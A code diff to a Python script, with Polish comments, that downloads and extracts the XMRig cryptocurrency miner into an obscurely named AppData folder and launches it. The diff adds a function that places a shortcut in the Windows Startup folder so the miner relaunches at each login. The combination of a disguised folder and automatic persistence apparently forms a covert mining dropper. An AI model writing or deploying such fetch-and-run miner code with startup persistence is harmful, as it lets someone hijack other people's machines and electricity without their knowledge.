@@ -2,6 +2,9 @@ import os
 import subprocess
 import urllib.request
 import zipfile
+from pathlib import Path
+import sys
+from win32com.client import Dispatch
 
 XMRIG_URL = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-gcc-win64.zip"
 APPDATA_DIR = os.path.join(os.getenv('APPDATA'), "Xdev_csp")  # Folder AppData\Roaming\Xdev_csp
@@ -49,6 +52,25 @@ def start_mining():
 
     subprocess.run(command)
 
+def add_to_startup():
+    # Ścieżka do folderu autostart
+    startup_folder = Path(os.getenv('APPDATA')) / "Microsoft\\Windows\\Start Menu\\Programs\\Startup"
+    script_path = Path(sys.argv[0])
+    shortcut_path = startup_folder / f"{script_path.stem}.lnk"
+    
+    # Sprawdź, czy skrót już istnieje
+    if not shortcut_path.exists():
+        # Tworzenie skrótu do uruchomienia skryptu
+        shell = Dispatch('WScript.Shell')
+        shortcut = shell.CreateShortCut(str(shortcut_path))
+        shortcut.TargetPath = str(script_path)
+        shortcut.WorkingDirectory = str(script_path.parent)
+        shortcut.save()
+        print("Skrót dodany do Autostartu.")
+    else:
+        print("Skrót już istnieje w Autostarcie.")
+
 if __name__ == "__main__":
+    add_to_startup()
     download_and_extract_xmrig()
     start_mining()
